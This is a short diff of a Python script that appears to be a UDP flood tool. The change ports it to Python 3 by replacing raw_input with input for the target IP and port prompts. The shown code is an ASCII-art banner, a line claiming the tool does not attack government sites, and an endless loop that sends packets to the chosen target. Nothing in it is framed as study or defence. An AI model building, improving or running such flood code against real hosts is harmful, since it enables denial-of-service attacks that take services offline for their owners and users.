@@ -21,8 +21,8 @@ print("           0       0      00        0000000      0     0        ")
 print("           0       0      0 0       0            0     0        ") 
 print("           0ppppppp0      0  0      0000000      0     0        ") 
 print("THIS TOOLS DONT ATTACK GOV")
-ip = raw_input("IP Target : ")
-port = input("Port       : ")
+ip = input("IP Target : ")
+port = input("Port     : ")
 
 while True:
      sock.sendto(bytes, (ip,port))
